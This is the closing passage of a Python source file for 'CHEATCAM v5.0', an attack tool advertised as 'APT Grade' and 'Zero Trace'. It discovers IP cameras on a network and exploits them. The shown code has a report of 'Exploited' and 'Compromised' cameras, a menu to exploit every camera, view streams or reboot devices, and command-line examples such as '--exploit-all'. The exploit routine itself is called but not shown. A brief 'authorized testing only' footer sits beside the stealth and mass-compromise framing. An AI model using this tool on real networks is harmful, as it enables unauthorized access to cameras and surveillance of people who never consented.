                        cprint(f"  {key}: {len(value)} items", Colors.DIM)
                        for item in value[:3]:
                            if isinstance(item, dict):
                                cprint(f"    - {str(item)[:100]}", Colors.DIM)
                    elif isinstance(value, dict):
                        for k, v in value.items():
                            if v:
                                cprint(f"  {k}: {v}", Colors.DIM)
                    else:
                        cprint(f"  {key}: {value}", Colors.DIM)
        
        print("="*60)
    
    def generate_report(self):
        """Generate comprehensive HTML report"""
        cprint("[REPORT] Generating report...", Colors.GOLD)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"cheatcam_report_{timestamp}.html"
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CHEATCAM v5.0 - Security Report</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
        .header {{ border-bottom: 2px solid #ffd700; padding-bottom: 10px; margin-bottom: 20px; }}
        .section {{ background: #111; padding: 15px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; }}
        .critical {{ color: #ff003c; }}
        .high {{ color: #ff8a00; }}
        .medium {{ color: #ffa500; }}
        .low {{ color: #ffd700; }}
        .stat-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 10px 0; }}
        .stat-card {{ background: #1a1a1a; padding: 15px; text-align: center; border: 1px solid #333; border-radius: 8px; }}
        .stat-number {{ font-size: 28px; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; }}
        td, th {{ padding: 8px; border: 1px solid #333; }}
        th {{ background: #222; color: #ffd700; }}
    </style>
</head>
<body>
    <div class="header">
        <h1 class="gold">CHEATCAM v5.0 - Security Assessment Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Author: {AUTHOR}</p>
    </div>
    
    <div class="section">
        <h2 class="gold">Executive Summary</h2>
        <div class="stat-grid">
            <div class="stat-card">
                <div class="stat-number" style="color:#ffd700;">{len(self.cameras)}</div>
                <div>Cameras</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff003c;">{len([c for c in self.cameras if c.vuln_cves])}</div>
                <div>Vulnerable</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff8a00;">{len(self.results)}</div>
                <div>Exploited</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#4ecdc4;">{sum(1 for r in self.results if r.get('success'))}</div>
                <div>Compromised</div>
            </div>
        </div>
    </div>
    
    <div class="section">
        <h2 class="gold">Cameras Found</h2>
        <table>
            <tr><th>IP</th><th>Brand</th><th>Model</th><th>Vulnerabilities</th></tr>
"""
        
        for cam in self.cameras:
            vulns = ', '.join(cam.vuln_cves) if cam.vuln_cves else 'None'
            color = 'critical' if cam.vuln_cves else 'low'
            html += f"""
            <tr>
                <td>{cam.ip}</td>
                <td>{cam.brand}</td>
                <td>{cam.model}</td>
                <td class="{color}">{vulns}</td>
            </tr>
"""
        
        html += """
        </table>
    </div>
    
    <div class="section" style="text-align:center;color:#666;">
        <p>Report generated by CHEATCAM v5.0</p>
        <p>Author: F1REW0LF | MIT License</p>
        <p>For authorized security testing only</p>
    </div>
</body>
</html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        cprint(f"[+] Report generated: {filename}", Colors.GREEN)
        return filename
    
    def run(self):
        print_banner()
        cprint("[*] CHEATCAM v5.0 - APT Grade Camera Testing", Colors.CYAN)
        cprint("[*] Zero Trace - AI-Powered - Military Grade", Colors.DIM)
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.discover()
            elif choice == '2':
                self.show_cameras()
            elif choice == '3':
                self.exploit_camera()
            elif choice == '4':
                self.exploit_all()
            elif choice == '5':
                self.view_stream()
            elif choice == '6':
                self.reboot_camera()
            elif choice == '7':
                self.get_info()
            elif choice == '8':
                self.show_results()
            elif choice == '9':
                self.generate_report()
            elif choice == '10':
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="CHEATCAM v5.0 - APT Grade Camera Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 cheatcam.py --discover
  python3 cheatcam.py --exploit --target 192.168.1.100
  python3 cheatcam.py --interface eth0 --exploit-all
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--discover", action="store_true", help="Discover only")
    parser.add_argument("--exploit", help="Exploit specific camera IP")
    parser.add_argument("--exploit-all", action="store_true", help="Exploit all cameras")
    parser.add_argument("--report", action="store_true", help="Generate report")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    tool = CheatCamUltimate(args.interface)
    
    if args.discover:
        tool.discover()
        tool.show_cameras()
        sys.exit(0)
    
    if args.exploit:
        tool.discover()
        for cam in tool.cameras:
            if cam.ip == args.exploit:
                exploit = AdvancedCameraExploit(cam)
                result = exploit.exploit()
                tool.results.append(result)
                break
        sys.exit(0)
    
    if args.exploit_all:
        tool.discover()
        tool.exploit_all()
        sys.exit(0)
    
    if args.report:
        tool.generate_report()
        sys.exit(0)
    
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
